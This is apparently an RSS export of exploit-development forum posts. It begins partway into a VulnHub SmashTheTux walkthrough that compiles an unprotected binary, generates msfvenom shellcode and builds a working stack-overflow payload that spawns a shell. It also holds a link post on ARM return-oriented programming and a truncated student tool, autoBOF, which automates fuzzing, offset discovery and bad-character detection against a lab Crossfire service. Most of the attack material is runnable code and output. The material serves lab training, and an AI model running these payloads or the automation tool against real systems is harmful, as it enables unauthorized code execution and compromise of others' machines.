gcc pwnme.c -o pwnme -fno-stack-protector -z execstack
</code></pre>
<p>Check with gdb-peda.</p>
<pre><code class="lang-auto">tux@tux:~/0x00$ gdb pwnme 
GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i586-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from pwnme...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
</code></pre>
<p>As you can see, NX protection is disabled for now. We need to know where we will jump by checking the <code>jmp call eax</code> address.</p>
<p>Searching for jmp/eax call, this information will be useful when overwritting EIP Address.</p>
<pre data-code-wrap="bash"><code class="lang-bash">gdb-peda$ jmpcall
0x8048393 : call eax
0x80483cd : call edx
0x8048420 : call edx
0x80485b7 : jmp [eax]
0x8049393 : call eax
0x80493cd : call edx
0x8049420 : call edx
0x80495b7 : jmp [eax]
</code></pre>
<p>We will use <code>0x8048393 : call eax</code> and note this address as return address.</p>
<p>Now, this is what we got so far:</p>
<ul>
<li>EIP Offset 0x41332541</li>
<li>Offset Number 268</li>
<li>return address 0x8048393</li>
<li>padding/nop =&gt; 268 - shellcode buf - 4</li>
</ul>
<p>We know that our offset is 268 and here is the formula I used:</p>
<blockquote>
<p>Padding + shellcode buf + return address</p>
</blockquote>
<p><strong>Generating Payload</strong></p>
<p>For this purpose, we need Venom for creating the payload because Spiderman is far from home :P. I think 268 bytes is enough for basic <code>exec</code> linux payload. You may use other shellcode than venom. I’m just prefer this for easy to use. I’m exclude “\x00\x0a\0d” from shellcode payload as bad character.</p>
<pre data-code-wrap="bash"><code class="lang-bash">↳ msfvenom -p linux/x86/exec CMD=/bin/bash -a x86 --platform linux  -f python -b "\x00\x0a\0d"
WARNING: Nokogiri was built against LibXML version 2.9.8, but has dynamically loaded 2.9.9
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 72 (iteration=0)
x86/shikata_ga_nai chosen with final size 72
Payload size: 72 bytes
Final size of python file: 358 bytes
buf =  ""
buf += "\xb8\x72\x71\x70\x34\xda\xc8\xd9\x74\x24\xf4\x5a\x29"
buf += "\xc9\xb1\x0c\x83\xea\xfc\x31\x42\x0f\x03\x42\x7d\x93"
buf += "\x85\x5e\x8a\x0b\xff\xcd\xea\xc3\xd2\x92\x7b\xf4\x45"
buf += "\x7a\x08\x93\x95\xec\xc1\x01\xff\x82\x94\x25\xad\xb2"
buf += "\xac\xa9\x52\x43\x9f\xcb\x3b\x2d\xf0\x69\xdd\xc2\x66"
buf += "\x6e\x4a\x76\xff\x8f\xb9\xf8"
</code></pre>
<p>Okay, time for generating our final payload:</p>
<pre data-code-wrap="python"><code class="lang-python">import os

# linux/x86/exec CMD=/bin/bash payload 
# bad char : "\x00\x0a\0d"

buf =  ""
buf += "\xb8\x72\x71\x70\x34\xda\xc8\xd9\x74\x24\xf4\x5a\x29"
buf += "\xc9\xb1\x0c\x83\xea\xfc\x31\x42\x0f\x03\x42\x7d\x93"
buf += "\x85\x5e\x8a\x0b\xff\xcd\xea\xc3\xd2\x92\x7b\xf4\x45"
buf += "\x7a\x08\x93\x95\xec\xc1\x01\xff\x82\x94\x25\xad\xb2"
buf += "\xac\xa9\x52\x43\x9f\xcb\x3b\x2d\xf0\x69\xdd\xc2\x66"
buf += "\x6e\x4a\x76\xff\x8f\xb9\xf8"

# define offset
offset = 268

# (268 - 72) - 4 = 192
padding = (offset - len(buf)) - 4

# NOPSLED as identifer with total offset - size of the buf
payload =  "\x90" * padding + buf

# overwrite EIP to jump to 'call eax' in little endians
payload += "\x93\x83\x04\08"

print payload
</code></pre>
<p>With that script, you don’t need to worry thinking of how many padding you should use.</p>
<p>Time to exploit:</p>
<pre data-code-wrap="bash"><code class="lang-bash">tux@tux:~/0x00$ echo $$
1335
tux@tux:~/0x00$ ps
  PID TTY          TIME CMD
 1335 pts/0    00:00:00 bash
 1437 pts/0    00:00:00 ps
tux@tux:~/0x00$ ./pwnme $(python exploit.py)
Val: �������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������rqp4���t$�Z)ɱ
                                      ���1BB}��^�
                                                 ����Ғ{�E�������%����RC��;-�i��fnJv������8
tux@tux:/home/tux/0x00$ echo $$
1440
tux@tux:/home/tux/0x00$ ps
  PID TTY          TIME CMD
 1335 pts/0    00:00:00 bash
 1439 pts/0    00:00:00 sh
 1440 pts/0    00:00:00 bash
 1445 pts/0    00:00:00 ps
tux@tux:/home/tux/0x00$ 
</code></pre>
<p>Horraaayyy! <img src="https://d.clarkee.co.uk/images/emoji/twitter/partying_face.png?v=15" title=":partying_face:" class="emoji" alt=":partying_face:" loading="lazy" width="20" height="20"><img src="https://d.clarkee.co.uk/images/emoji/twitter/partying_face.png?v=15" title=":partying_face:" class="emoji" alt=":partying_face:" loading="lazy" width="20" height="20"><img src="https://d.clarkee.co.uk/images/emoji/twitter/partying_face.png?v=15" title=":partying_face:" class="emoji" alt=":partying_face:" loading="lazy" width="20" height="20"></p>
<p>I will discuss Level 0x01 in the next series of SmashTheTux. Feedback are welcome &lt;3. See ya!</p>
<p>Reference:</p>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/120.html" class="inline-onebox" rel="noopener nofollow ugc">CWE - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow') (4.18)</a></li>
<li><a href="https://www.freebsd.org/cgi/man.cgi?query=strlcpy&amp;sektion=3" class="inline-onebox" rel="noopener nofollow ugc">strlcpy(3)</a></li>
<li><a href="https://github.com/ebtaleb/peda_cheatsheet/blob/master/peda.md" class="inline-onebox" rel="noopener nofollow ugc">peda_cheatsheet/peda.md at master · ebtaleb/peda_cheatsheet · GitHub</a></li>
<li><a href="https://chortle.ccsu.edu/AssemblyTutorial/Chapter-15/ass15_3.html" rel="noopener nofollow ugc">https://chortle.ccsu.edu/AssemblyTutorial/Chapter-15/ass15_3.html</a></li>
<li><a href="https://www.shellblade.net/docs/ret2libc.pdf" rel="noopener nofollow ugc">https://www.shellblade.net/docs/ret2libc.pdf</a></li>
<li><a href="https://decoder.cloud/2017/06/15/simple-aslrnx-bypass-on-a-linux-32-bit-binary/" class="inline-onebox" rel="noopener nofollow ugc">Simple ASLR/NX bypass on a Linux 32 bit binary – Decoder's Blog</a></li>
<li><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/" class="inline-onebox" rel="noopener nofollow ugc">Bypassing NX bit using return-to-libc – sploitF-U-N</a></li>
<li><a href="https://reboare.github.io/bof/linux-stack-bof-3.html" class="inline-onebox" rel="noopener nofollow ugc">Stack Buffer Overflows: Linux 3 - Bypassing DEP with ROP | Booj</a></li>
<li><a href="https://www.coengoedegebure.com/buffer-overflow-attacks-explained/" class="inline-onebox" rel="noopener nofollow ugc">Buffer overflow attacks explained</a></li>
</ul>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/vulnhub-smashthetux-chapter-0x00-basic-buffer-overflow-ret2libc/14850">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/vulnhub-smashthetux-chapter-0x00-basic-buffer-overflow-ret2libc/14850</link>
          <pubDate>Tue, 09 Jul 2019 09:57:45 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-14850</guid>
          <source url="https://d.clarkee.co.uk/t/vulnhub-smashthetux-chapter-0x00-basic-buffer-overflow-ret2libc/14850.rss">[VulnHub] SmashTheTux - Chapter 0x00 - Basic Buffer Overflow &amp; Ret2libc</source>
        </item>
        <item>
          <title>Return Oriented Programming on ARM (32-bit)</title>
          <dc:creator><![CDATA[icyphox]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>Hi!<br>
I’ve always just lurked on here, this is my first post.</p>
<p>So as a part of my summer internship, I’ve been working at an IoT security firm. I’ve been teaching myself ARM security and reversing to apply in IoT security. I figured I’d share what I’ve learnt so far <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://icyphox.sh/static/favicon.ico" class="site-icon" width="16" height="16">
      <a href="https://icyphox.sh/blog/rop-on-arm/" target="_blank" rel="noopener nofollow ugc">icyphox.sh</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0379788cc90e5520aee3fea2016c3840c96982de.png" class="thumbnail" width="" height="">

<h3><a href="https://icyphox.sh/blog/rop-on-arm/" target="_blank" rel="noopener nofollow ugc">Return Oriented Programming on ARM (32-bit)</a></h3>

<p>Making stack-based exploitation great again!</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

            <p><small>10 posts - 4 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/return-oriented-programming-on-arm-32-bit/14183">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/return-oriented-programming-on-arm-32-bit/14183</link>
          <pubDate>Thu, 06 Jun 2019 16:01:41 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-14183</guid>
          <source url="https://d.clarkee.co.uk/t/return-oriented-programming-on-arm-32-bit/14183.rss">Return Oriented Programming on ARM (32-bit)</source>
        </item>
        <item>
          <title>autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</title>
          <dc:creator><![CDATA[Rain]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p><strong>TL;DR I wrote a program to automate buffer overflows. I talk about what buffer overflows are, why I made this program, and show all the code I used.</strong></p>
<p>In 11 days from now, it will have been a year since I first started on my journey of becoming an Offensive Security Certified Professional. In 15 days from now, it will have been a year since the lowest point in my infosec journey. I was feeling very discouraged and out of my depth. During the 4 days in between, I had been breezing through the material - covering multiple sections of coursework in a day. But when I got to the buffer overflow section of the learning material, and it just did not click with me. I failed over and over again for 3 straight days to grasp the material. I began to wonder if I had tried to do too much, too fast and wasn’t sure if I was in over my head or not. I stayed up late that third day, trying to get back on track, and I finally exploited the practice server Offsec provided me. I was ecstatic! And for the most part, I moved on to the next part of my coursework, filing away that new knowledge for the time being. But those three days planted a small seed of pure vengeance in my heart. “Screw buffer overflows!”, the seed said. “You should make it so no one ever has to make these again!”.</p>
<p>As it would turn out, my university wanted me to make something before they’d let me graduate. As long as my advisor deemed it sufficiently complex of a task, I could make whatever my heart desired. As previously stated, my heart desired vengeance (being very fertile soil for such things). Fortunately my advisor thought the idea was interesting and gave me the go-ahead. My first step was to create a design document, outlining the intended functionality of my little project and what it’d look like at each stage. I dreamed very big. The original intention for autoBOF was cross-platform with support for integrating multiple different debuggers in the process. In fact, it was also intended to be a tool used remotely - a thin client that would connect to a remote laboratory environment. It would be a masterpiece, a sword crafted to slay the tedious monster of my past.</p>
<p>None of that happened of course, and the tool ended up being about 500 lines of poorly optimized python that can only run on a local (Linux) laboratory environment. It’s wonky, takes about a minute to run in a best-case scenario, and doesn’t perform anywhere near as well as I originally expected it to. But it works. At least, it works against the crossfire application included in my PWK Kali VM. I do not have the illusion that my code is of any particular quality. In fact, if my professors actually looked at the code I’m about to show you, they may take away the CS degree I expect to receive next month.</p>
<p>Despite having said all of that, this took a lot of effort to make on my part, mostly during the hours of 10PM and 3AM before my weekly progress reports, as well as 0 to 3 random afternoons of any given week. There were also a couple occasions where I over promised what I would accomplish during a given period of time and had to frantically work to make up the difference. It seemed that every time I tried to take something I knew how to do manually and have my program do it automatically, I ran into some difficult (to me) problem to solve that I never anticipated beforehand. Because the tasks required for this program had an extremely minimal overlap with my formal education in programming, I had to break new ground whenever I wanted to do anything. Did I mention this is the first python program I’ve written? Anyway, let’s briefly discuss how these kinds of buffer overflows work and then get to the code.</p>
<hr>
<p>The kind of buffer overflow autoBOF intends to exploit is a very basic kind of overflow. Say there is a server somewhere, that accepts data and stores it in a variable somewhere. Kind of a stretch, but bear with me. And then let’s assume that this server stores this data in variables of a fixed length. What happens if the server lets you send it more data than it can store? What does it do with the extra data? In our ideal case, it just puts it in adjacent memory space, overwriting some other poor sap’s data. And if we can write to system memory… can’t we tell the server to do things it’s not supposed to? That’s the plan! Our general approach is:</p>
<ol>
<li>Fuzz the target server. Does it crash when we send lots of data?</li>
<li>If the server crashes, we may have done something! Let’s find out exactly how much data it takes to crash the server.</li>
<li>We discover that the server crashes when we send X bytes, and the register that directs program execution is overwritten at Y bytes. So we can execute X - Y bytes of code. Hurray!</li>
<li>Sometimes, certain values aren’t processed by the server the way we want them to be processed. Let’s send every relevant value to the server and see if they come out the way we want them to. If not, those values are ‘bad’ and of an undiscerning character. So we call them ‘bad characters’. Or some reason like that.</li>
<li>Next, we need to find a JMP instruction to hijack. We need to tell the program to jump to the payload we make and execute it.</li>
<li>Lastly, if there’s enough space between X and Y to fit our whole payload, we generate one and send it in! If there isn’t enough space, we can put the payload inside our buffer (before Y bytes of data), and hope that we have enough space in the payload space to say ‘Jump to the payload at the start of the buffer’.</li>
</ol>
<p>Note: Please forgive me for any improper indentations. I had to change leading spaces to <code>&amp;nbsp;</code> and may have missed some. You can find the original code at <a href="https://github.com/DiscipleOfDust/autoBOF" rel="nofollow noopener">https://github.com/DiscipleOfDust/autoBOF</a></p>
<hr>
<pre><code class="lang-python">#!/usr/bin/python
# -*- coding: utf-8 -*- 
import socket, sys
import os
import time #make fuzzing more robust (sticky note)
if(sys.argv[1] == "-help" or sys.argv[1] == "-h"): #consider two modes - one with user input, and the other with command line logic
 print "Usage: python autoBOF.py -start [initial data sequence including spaces] -end [any post-payload data sequence including spaces] -l [minimum buffer length] [maximum buffer length] -i [number of bytes to increment buffer by for each attempt] -target [remote IP] [remote port] -local [local IP] [shell port] -p [maximum attempts at payload generation] -n [name of exploit] -s [verbose by default, include to minimize stdout] \n\nExample: python autoBOF.py -start \"x11(setup sound \" -end \"x90x00#\" -l 4368 4400 -i 1 -target 127.0.0.1 13327 -local 127.0.0.1 1337 -p 5 -n overflow.py \nAlternatively, type \"python autoBOF.py -config /path/to/file.txt\" to use a configuration file instead" 
 print "--------------------------------------------------------------------------------------------------"
 print "Config file format example:\nstart: \x11(setup sound \nend:\x90\x00#\nlengthMin: 4368\nlengthMax: 4400\nincrement: 1\ntargetIP: 127.0.0.1\ntargetPort: 13327\nlocalIP: 127.0.0.1\nshellPort: 1337\npayloadAttempts: 5\nexploitName: autoExploit.py\nsilent: False"
 print "--------------------------------------------------------------------------------------------------"
 print "IMPORTANT: Requires partner script, restart.py to be running in tandem. Usage for restart.py: Move file to directory containing vulnerable service binary and type \"gdb -q -x restart.py [service name]\""
 sys.exit()
#init vals
curVal = 0
argStart = 'autoBOF' #AutoBOF is uninit value for input checking
argEnd = 'autoBOF'
argLengthMin = 'autoBOF'
argLengthMax = 'autoBOF'
argIncrement = 'autoBOF'
argTargetIP = 'autoBOF'
argTargetPort = 'autoBOF'
argLocalIP = 'autoBOF'
argShellport = 'autoBOF'
argPayloadAttempts = 'autoBOF'
argExploitName = 'autoBOF'
argSilent = False

if(sys.argv[1] != "-config"):
 for x in sys.argv:
  curVal = curVal + 1
  if (x == "-start"):
   argStart = sys.argv[curVal] #Consider escaping these like below
   argStart = argStart.decode('string_escape')
  elif(x == "-end"):
   argEnd = sys.argv[curVal]
   argEnd = argEnd.decode('string_escape')
  elif(x == "-l"):
   argLengthMin = sys.argv[curVal]
   argLengthMax = sys.argv[curVal+1]
  elif(x == "-i"):
   argIncrement = sys.argv[curVal]
  elif(x == "-target"):
   argTargetIP =  sys.argv[curVal]
   argTargetPort = sys.argv[curVal+1]
  elif(x == "-local"):
   argLocalIP = sys.argv[curVal]
   argShellPort = sys.argv[curVal+1]
  elif(x == "-p"):
   argPayloadAttempts = sys.argv[curVal]
  elif(x == "-n"):
   argExploitName = sys.argv[curVal]
  elif(x == "-s"):
   argSilent = True
else:
 fileName = sys.argv[2]
 bufFile = open(fileName,"r")
 configFile = bufFile.read()
 configFile = configFile.split('\n') #newlines are common bad character, so not being able to parse them in config files isn't the worst thing in the world.
 tempIndex = configFile[0].find(':')
 argStart = configFile[0][tempIndex+2:]
 argStart = argStart.decode('string_escape')
 tempIndex = configFile[1].find(':')
 argEnd = configFile[1][tempIndex+2:]
 argEnd = argEnd.decode('string_escape')
 tempIndex = configFile[2].find(':')
 argLengthMin = configFile[2][tempIndex+2:]
 tempIndex = configFile[3].find(':')
 argLengthMax = configFile[3][tempIndex+2:]
 tempIndex = configFile[4].find(':')
 argIncrement = configFile[4][tempIndex+2:]
 tempIndex = configFile[5].find(':')
 argTargetIP = configFile[5][tempIndex+2:]
 tempIndex = configFile[6].find(':')
 argTargetPort = configFile[6][tempIndex+2:]
 tempIndex = configFile[7].find(':')
 argLocalIP = configFile[7][tempIndex+2:]
 tempIndex = configFile[8].find(':')
 argShellPort = configFile[8][tempIndex+2:]
 tempIndex = configFile[9].find(':')
 argPayloadAttempts = configFile[9][tempIndex+2:]
 tempIndex = configFile[10].find(':')
 argExploitName = configFile[10][tempIndex+2:]
 tempIndex = configFile[11].find(':')
 argSilent = configFile[11][tempIndex+2:]
 if (argSilent == "True"):
  argSilent = True
 else:
  argSilent = False
#Check the arguments for proper initialization
if(argStart == 'autoBOF'):
 print 'ERROR: uninitialized start argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argEnd == 'autoBOF'):
 print 'ERROR: uninitialized end argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argLengthMin == 'autoBOF' or argLengthMin.isdigit() == False):
 print 'ERROR: uninitialized or invalid minimum buffer length argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argLengthMax == 'autoBOF' or argLengthMax.isdigit() == False):
 print 'ERROR: uninitialized or invalid maximum buffer length argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argIncrement == 'autoBOF' or argIncrement.isdigit() == False):
 print 'ERROR: uninitialized or invalid buffer length increment argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argTargetIP == 'autoBOF'):
 print 'ERROR: uninitialized Target IP argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argTargetPort == 'autoBOF' or argTargetPort.isdigit() == False):
 print 'ERROR: uninitialized or invalidTarget Port argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argLocalIP == 'autoBOF'):
 print 'ERROR: uninitialized Local IP argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argShellPort == 'autoBOF' or argShellPort.isdigit() == False):
 print 'ERROR: uninitialized Shell Port argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argPayloadAttempts == 'autoBOF' or argPayloadAttempts.isdigit() == False):
 print 'Warning: Unitialized number of payload attemps. Will be set to 3. Try autoBOF.py -h for more details'
 argPayloadAttempts = 3
if(argExploitName == 'autoBOF'):
 print 'ERROR: uninitialized Exploit Name argument. Try autoBOF.py -h for more details'
 sys.exit()
if(len(argExploitName) &lt; 3):
 print 'ERROR: Exploit name must be at least three characters long'
sys.exit()
</code></pre>
<hr>
<p>Alright, so here we have how the user interacts with the program. They can either make a configuration file (my recommendation) which contains all the necessary specifications for the program to execute, or they can use flags if they are so inclined. I found there to be so many flags that I never actually tested whether or not that functionality worked. I ran into some encoding issues that made me try to configuration file as a solution, and when I solved that problem (which turned out to be completely unrelated to the input method), I slapped the same solution onto the flag parsing, but since I never tested that it may be completely broken.</p>
<p>You may also notice a lack of shell customization (Never got around to implementing shell customization. It might have taken half an hour, it might have taken a day). Hopefully bind shells are okay. I also hope that your service doesn’t require one of the variables to be ‘autoBOF’ for some reason, because then my program wouldn’t work at all. Of particular note here are my half assed type checking and some random comments I don’t remember making and could have sworn I removed from the code for being irrelevant or nonsensical.</p>
<hr>
<pre><code class="lang-python">#Start program execution
if(not argSilent):
 os.system("figlet autoBOF") #Optional but very important dependency
host = argTargetIP
port = int(argTargetPort)
buffer = ('\x41')
start = argStart
end = argEnd
isSuccess = False
overflow = buffer
tryUntil = int(argLengthMax)
startCount = int(argLengthMin)
increment = int(argIncrement)
if(not argSilent):
 print "---- Attempting to Crash Service ----"
while(startCount &lt; tryUntil and isSuccess == False):
 try:
  s = socket.socket()
  s.connect((host, port))
  data = s.recv(1024)
  startCount = startCount + increment
  if(not argSilent):
   print "fuzzing at", startCount, "bytes", "out of", tryUntil
  overflow = start + (buffer * startCount) + end
  s.send(overflow)
  s.close()
  time.sleep(.6)
  bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
  eipValue = bufFile.read()
  if("0x41414141" in eipValue):
   if(not argSilent):
    print "---- Service Crashed With EIP overwrite ----"
    print "!! Overflow at",startCount,"bytes"
   isSuccess = True
 except socket.error, e:
  bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
  eipValue = bufFile.read()
  if("0x41414141" in eipValue):
   if(not argSilent):
    print "---- Service Crashed With EIP overwrite ----"
    print "!! Overflow at",startCount,"bytes"
   isSuccess = True
  break
if(not isSuccess):
 if(not argSilent):
  print "---- Service is Resilient  ----"
  print("No overflow up to"),tryUntil,"bytes"
 sys.exit()
#END OVERFLOW DETECTION
</code></pre>
<hr>
<p>I hope you like the code you see above because I copy and paste it a lot instead of reusing it in a method like a practical, efficient programmer. Here the program sends a sequence of A’s to the service inside a user-specified wrapper. The debugger script I wrote (which will be shown later) dumps the eip register whenever the targeted service crashes. The code will loop until it reaches the user specified limit or until the EIP register is overwritten with A’s. If it is, we can continue searching for our buffer overflow! If A is a bad character we’ll be in a bit of trouble, though. Anyway, one of the problems I had with this section of code was trying to figure out the optimal way to fuzz a service. Some of these overflows only happen at extremely specific amounts of data, and a difference of one byte could make or break the exploit. As a result, I decided to leave it entirely up to the user and thus absolve myself of that responsibility. By that I mean to say I’m empowering the users by maximizing the customization potential of my software.</p>
<hr>
<pre><code class="lang-python">if(not argSilent):
 print("--- Generating Unique Buffer ---")
bashCommand = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l "
strTest = str(startCount)
bashCommand = bashCommand + strTest + " &gt; offsetStr.txt"
os.system(bashCommand)
bufFile = open("offsetStr.txt", "r")
newBuffer = bufFile.read()
newBuffer = newBuffer.strip('\n')
newBuffer = start + newBuffer + end
s = socket.socket()
s.connect((host, port))
s.send(newBuffer)
bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
eipValue = bufFile.read()
if(not argSilent):
 print("Unique Buffer Sent")
 print("--- Attempting EIP overwrite ---")
bashCommand = "rm offsetStr.txt"
os.system(bashCommand)
s.close()
time.sleep(.6)
bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
eipValue = bufFile.read()
startValue = eipValue.find("0x")
eipValue = eipValue[startValue:(startValue+10)]
if(not argSilent):
 print ("EIP overwrite successful")
bashCommand = "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l " + strTest + " -q " + eipValue
os.system(bashCommand + " &gt; offset.txt")
bufFile = open("offset.txt")
offset = bufFile.read()
startValue = offset.find("offset")+7
offset = offset[startValue:]
offset = offset.strip('\n')
offset = int(offset)
shellSpace = startCount - offset

if(not argSilent):
print "Offset is at", offset, "bytes with", (shellSpace), "bytes of post-offset shellcode space"
</code></pre>
<hr>
<p>The above code is very straightforward - I call Metasploit’s pattern creation and offset tools to add a custom string to the buffer in order to determine exactly where the overwrite takes place. This lets me know how much space I have to work with to place shellcode. I am again aided by my lovely debugger script.</p>
<hr>
<pre><code class="lang-python"> ########## Bad Character Phase ##########
 print '--- Bad Character Detection Phase ---'
#removed 00, 0A, OD, FF as common bad characters
badchars_hex = ["\x00", "\x0a", "\x0d", "\xff"]
badchars_text = ["00","0a","0d","ff"]
allchars_hex = ["\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0b","\x0c","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe"]
allchars_text = ["01","02","03","04","05","06","07","08","09","0b","0c","0e","0f","10","11","12","13","14","15","16","17","18","19","1a","1b","1c","1d","1e","1f","20","21","22","23","24","25","26","27","28","29","2a","2b","2c","2d","2e","2f","30","31","32","33","34","35","36","37","38","39","3a","3b","3c","3d","3e","3f","40","41","42","43","44","45","46","47","48","49","4a","4b","4c","4d","4e","4f","50","51","52","53","54","55","56","57","58","59","5a","5b","5c","5d","5e","5f","60","61","62","63","64","65","66","67","68","69","6a","6b","6c","6d","6e","6f","70","71","72","73","74","75","76","77","78","79","7a","7b","7c","7d","7e","7f","80","81","82","83","84","85","86","87","88","89","8a","8b","8c","8d","8e","8f","90","91","92","93","94","95","96","97","98","99","9a","9b","9c","9d","9e","9f","a0","a1","a2","a3","a4","a5","a6","a7","a8","a9","aa","ab","ac","ad","ae","af","b0","b1","b2","b3","b4","b5","b6","b7","b8","b9","ba","bb","bc","bd","be","bf","c0","c1","c2","c3","c4","c5","c6","c7","c8","c9","ca","cb","cc","cd","ce","cf","d0","d1","d2","d3","d4","d5","d6","d7","d8","d9","da","db","dc","dd","de","df","e0","e1","e2","e3","e4","e5","e6","e7","e8","e9","ea","eb","ec","ed","ee","ef","f0","f1","f2","f3","f4","f5","f6","f7","f8","f9","fa","fb","fc","fd","fe"]
bufCount = 0
allchars_unsure_hex = []
allchars_unsure_text = []
while(len(allchars_hex) &gt; 4):
 section_hex = allchars_hex[3] + allchars_hex[2] + allchars_hex[1] + allchars_hex[0]
 section_text = allchars_text[0] + allchars_text[1] + allchars_text[2] + allchars_text[3]
 bufCount = bufCount + 1
 section_text = section_text.replace("\\", "")
 section_text = section_text.replace("x", "")
 section_text = "0x" + section_text
 if(not argSilent):
  print section_text, "Section being searched for in memory"
 newBuffer = start + "BBBB" + section_hex + ("\x41" * (offset-8)) + "CCCC" + (shellSpace * "/x41") + end

 s = socket.socket()
 s.connect((host, port))
 s.send(newBuffer)
 time.sleep(.6)
 bufFile = open("/usr/games/crossfire/bin/badchars.txt", "r")
 badData = bufFile.read()

 firstEggLocation = badData.find("0x42424242") + 11
 lastEggLocation = badData.find("0x41414141")
 badData = badData[firstEggLocation:lastEggLocation]
 if(not argSilent):
  print "-----stack------"
  print badData
  print "------------------"

 if(section_text in badData):
  allchars_text = allchars_text[4:]
  allchars_hex = allchars_hex[4:]
  continue
 else:
  if(not argSilent):
   print "BAD CHARACTER DETECTED IN ", section_text
  #move to unsure variabless
  allchars_unsure_text =  allchars_unsure_text + allchars_text[:4]
  allchars_unsure_hex =  allchars_unsure_hex + allchars_hex[:4]
  allchars_text = allchars_text[4:]
  allchars_hex = allchars_hex[4:]

allchars_unsure_hex = allchars_unsure_hex + allchars_hex
allchars_unsure_text = allchars_unsure_text + allchars_text
if(not argSilent):
 print "unsure values are", allchars_unsure_text
 print "---Verifying Bad Characters ---"
#Final Badchar Verification Phase
while(len(allchars_unsure_hex) &gt; 0):
